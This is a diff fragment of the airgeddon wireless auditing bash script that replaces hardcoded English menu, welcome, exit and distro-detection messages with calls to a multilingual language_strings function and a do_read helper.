+	language_strings $language 73 "green"
 	echo "       ____        ____  __   _______"
 	echo "___  _/_   | _____/_   |/  |_ \   _  \_______"
 	echo "\  \/ /|   |/  ___/|   \   __\/  /_\  \_  __ \ "
@@ -768,24 +1132,35 @@ function credits_option() {
 	echo "		       '.__.'"
 	echo "		        |  |"
 	echo
-	echo_blue "This script is under GPLv2 (or later) License."
-	echo_blue "Thanks to the \"Spanish pen testing crew\" for beta testing and support received."
-	read -p "Press [Enter] key to continue..."
+	language_strings $language 74 "blue"
+	language_strings $language 75 "blue"
+	language_strings $language 85 "blue"
+	do_read
+}
+
+function invalid_language_selected() {
+
+	echo
+	language_strings $language 82 "yellow"
+	echo
+	do_read
+	echo
+	language_option
 }
 
 function invalid_menu_option() {
 
 	echo
-	echo_yellow "Invalid menu option was chosen"
-	read -p "Press [Enter] key to continue..."
+	language_strings $language 76 "yellow"
+	do_read
 }
 
 function invalid_iface_selected() {
 
 	echo
-	echo_yellow "Invalid interface was chosen"
+	language_strings $language 77 "yellow"
 	echo
-	read -p "Press [Enter] key to continue..."
+	do_read
 	echo
 	select_interface
 }
@@ -794,9 +1169,9 @@ function killing_script() {
 
 	echo
 	echo
-	echo_yellow "Please, exit properly using menu option"
+	language_strings $language 12 "yellow"
 	echo
-	read -p "Press [Enter] key to continue..."
+	do_read
 
 	if [ "$current_menu" = "main" ]; then
 		menu_options
@@ -809,7 +1184,7 @@ function exit_script_option() {
 
 	echo
 	echo_red "************************************Exit****************************************"
-	echo_blue "Exiting airgeddon script - 2016 - See you soon! :)"
+	language_strings $language 11 "blue"
 	echo
 	exit
 }
@@ -818,21 +1193,33 @@ function detect_distro() {
 
 	uname -a | grep kali > /dev/null
 	if [ "$?" = "0" ]; then
-		echo_yellow "Kali Linux distro detected. Script can continue..."
+		language_strings $language 2 "yellow"
 		distro="Kali"
+		distro_language="english"
+		if [ "$distro_language" != "$language" ];then
+			echo
+			language=$distro_language
+			language_strings $language 3 "yellow"
+		fi
 		echo
 		return
 	fi
 
 	uname -a | grep wifislax > /dev/null
 	if [ "$?" = "0" ]; then
-		echo_yellow "Wifislax Linux distro detected. Script can continue..."
+		language_strings $language 4 "yellow"
 		distro="Wifislax"
+		distro_language="spanish"
+		if [ "$distro_language" != "$language" ];then
+			echo
+			language=$distro_language
+			language_strings $language 3 "yellow"
+		fi
 		echo
 		return
 	fi
 
-	echo_yellow "No compatible distro detected"
+	language_strings $language 5 "yellow"
 	exit_script_option
 }
 
@@ -841,15 +1228,15 @@ function welcome() {
 	clear
 	current_menu="main"
 	echo_red "***********************************Welcome**************************************"
-	echo_blue "Welcome to airgeddon script"
+	language_strings $language 6 "blue"
 	echo
-	echo_green "This script is only for educational purposes. Be good boyz&girlz"
+	language_strings $language 7 "green"
 	echo
-	echo_blue "This script is only working on Kali Linux and Wifislax"
-	echo_blue "Detecting distro..."
+	language_strings $language 8 "blue"
+	language_strings $language 9 "blue"
 	echo
 	detect_distro
-	read -p "Press [Enter] key to continue..."
+	do_read
 
 	select_interface
 	menu_options
